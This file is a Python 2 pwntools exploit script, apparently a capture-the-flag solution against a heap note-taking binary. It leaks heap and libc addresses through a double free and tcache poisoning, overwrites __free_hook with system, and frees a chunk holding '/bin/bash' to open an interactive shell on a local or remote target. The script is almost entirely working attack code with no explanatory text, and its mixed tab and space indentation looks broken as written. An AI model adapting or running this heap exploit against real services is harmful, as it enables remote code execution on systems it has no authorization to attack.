#!/usr/bin/python2
# -*- coding:utf-8 -*-
from pwn import *
import sys
import platform

'''
	待修改数据
'''
context.log_level = 'debug'
context.arch = 'amd64'				# 32位使用i386
context.os = 'linux'

execve_file = ELF('pwn')
lib_file = ELF("./libc.so.6")


log.info('-----------------------------------------------------------')

def node_add(r, size, note, desc):
    r.recvuntil('> \n')
    r.sendline('1')

    r.recvuntil('Size: ')
    r.sendline(str(size))

    r.recvuntil('Note: ')
    r.send(note)

    r.recvuntil('Description of this note: ')
    r.send(desc)


def node_list(r):
    r.recvuntil('> \n')
    r.sendline('2')

    return r.recvuntil('1. Add a note')


def node_del(r, idx):
    r.recvuntil('> \n')
    r.sendline('3')


    r.recvuntil('Which note do you want to delete?\nIndex: ')
    r.sendline(str(idx))


def exp():

	if 'd' in sys.argv:
            r = process('./pwn')
            #r = gdb.debug('./pwn', env = {'LD_LIBRARY_PATH' : './'})
	else:
		r = remote(sys.argv[1], sys.argv[2])

        #leak the chunk address
        node_add(r, 0x78, 'a', 'a\n')     #0 chunk_base
        node_add(r, 0x78, p64(0) * 4 + p64(0) + p64(0x21), 'a\n')     #1 chunk_base + 0x80
        node_add(r, 0x78, 'a', 'a\n')     #2 chunk_base + 0x80 * 2
        node_add(r, 0x78, 'a', 'a\n')     #3 chunk_base + 0x80 * 3
        node_add(r, 0x78, 'a', 'a\n')     #4 chunk_base + 0x80 * 4
        node_add(r, 0x78, 'a', 'a\n')     #5 chunk_base + 0x80 * 5
        node_add(r, 0x78, 'a', 'a\n')     #6 chunk_base + 0x80 * 6
        node_add(r, 0x78, 'a', 'a\n')     #7 chunk_base + 0x80 * 7
        node_add(r, 0x78, 'a', 'a\n')     #8 chunk_base + 0x80 * 8
        node_add(r, 0x78, p64(0) * 2 + p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x21), 'a\n')     #9 chunk_base + 0x80 * 9



        node_del(r, 8)
        node_del(r, 7)
        node_del(r, 6)
        node_del(r, 5)
        node_del(r, 4)
        node_del(r, 3)
        node_del(r, 0)                      #tcache full

        node_del(r, 9)
        node_del(r, 2)
        node_del(r, 1)


        node_add(r, 0x78, p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x81), 'a' * 0x30)      #0 chunk_base
        info = node_list(r).split('Note 1:\n  Data: ')[1].split('\n  Desc: ')[0]
        chunk_base = u64(info.ljust(8, '\x00')) - 0x80 * 2
        log.info('chunk_base => %x'%(chunk_base))



        node_del(r, 1)                      #double free


        node_add(r, 0x78, p64(chunk_base + 0x30), 'a\n')             #1 chunk_base + 0x80
        node_add(r, 0x78, 'a', 'a\n')           #2 chunk_base + 0x80 * 3 
        node_add(r, 0x78, 'a', 'a\n')           #3 chunk_base + 0x80 * 4
        node_add(r, 0x78, 'a', 'a\n')           #4 chunk_base + 0x80 * 5
        node_add(r, 0x78, 'a', 'a\n')           #5 chunk_base + 0x80 * 6
        node_add(r, 0x78, 'a', 'a\n')           #6 chunk_base + 0x80 * 7
        node_add(r, 0x78, 'a', 'a\n')           #7 chunk_base + 0x80 * 8        tcache empty


        node_add(r, 0x78, 'a', 'a\n')           #8 chunk_base + 0x80
        node_add(r, 0x78, p64(0) * ((0x80 - 0x30 - 0x10) / 0x8) + p64(0) + p64(0x81), 'a\n')           #9 chunk_base + 0x30

        node_del(r, 8)                          #to show unsorted_bin in index9
        node_del(r, 0)

        node_add(r, 0x78, p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x471), 'a\n')    #0 chunk_base                  change the chunk size in index8
        node_del(r, 9)
        node_add(r, 0x78, 'a', 'a' * 0x30)                                               #8 chunk_base + 0x80       change the flag in index8
        info = node_list(r).split('Note 9:\n  Data: ')[1].split('\n  Desc: ')[0]
        lib_base = u64(info.ljust(8, '\x00')) + 0x7fdb734b0000 - 0x7fdb734a7be0
        log.info('lib_base => %x'%lib_base)


        node_del(r, 0)
        node_add(r, 0x78, p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x81), 'a\n')                              #0 chunk_base
        node_del(r, 1)
        node_add(r, 0x78, p64(0) * 4 + p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x21), 'a\n')                 #1 chunk_base + 0x80




        node_del(r, 3)
        node_del(r, 2)
        node_del(r, 1)
        node_del(r, 9)
        free_hook = lib_base + lib_file.sym['__free_hook'] - 0x7f0d689bbb28 + 0x7f0d687f6b28
        log.info('__free_hook => %x'%(free_hook))
        node_add(r, 0x78, p64(0) * ((0x70 - 0x30) / 0x8) + p64(0) + p64(0x81) + p64(free_hook), 'a\n')                          #1 chunk_base + 0x30
        node_add(r, 0x78, '/bin/bash\x00', 'a\n')                       #2 chunk_base + 0x80

        system = lib_base + lib_file.sym['system'] - 0x7f0d688449f0 + 0x7f0d6867f9f0
        log.info('system => %x'%(system))
        node_add(r, 0x78, p64(system), 'a\n')


        node_del(r, 2)
        r.interactive()



exp()

	
log.info('-----------------------------------------------------------')

